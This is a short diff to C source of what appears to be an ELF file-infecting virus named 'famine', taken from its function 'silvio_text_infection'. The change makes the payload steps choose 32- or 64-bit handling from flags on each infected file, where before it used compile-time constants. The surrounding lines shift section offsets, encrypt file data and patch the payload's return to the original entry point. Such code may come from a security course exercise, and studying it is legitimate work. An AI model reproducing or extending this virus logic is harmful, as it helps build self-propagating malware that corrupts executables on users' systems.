@@ -73,11 +73,11 @@ void silvio_text_infection(t_famine *famine)
     famine->ehdr->e_shoff += PAGE_SIZE;
 
     cipher_famine_file_data(famine);
-    if (ARCH_32)
+    if (famine->elf_32)
     {
         overwrite_payload_ret2oep(famine);
     }
-    else if (ARCH_64)
+    else if (famine->elf_64)
     {
         overwrite_keysection_payload(famine);
         overwrite_payload_getencryptedsectionaddr(famine);
